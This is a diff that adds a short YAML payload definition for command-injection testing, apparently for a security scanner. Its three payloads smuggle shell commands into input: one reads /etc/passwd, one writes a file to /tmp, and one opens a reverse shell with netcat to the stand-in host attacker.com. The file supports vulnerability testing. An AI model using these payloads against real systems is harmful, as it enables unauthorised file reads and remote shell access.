@@ -1,0 +1,7 @@
+name: "Command Injection"
+type: "cmdi"
+severity: "high"
+payloads:
+  - "| cat /etc/passwd"
+  - "| echo 'hacked' > /tmp/hacked.txt"
+  - "; nc -e /bin/bash attacker.com 1234"
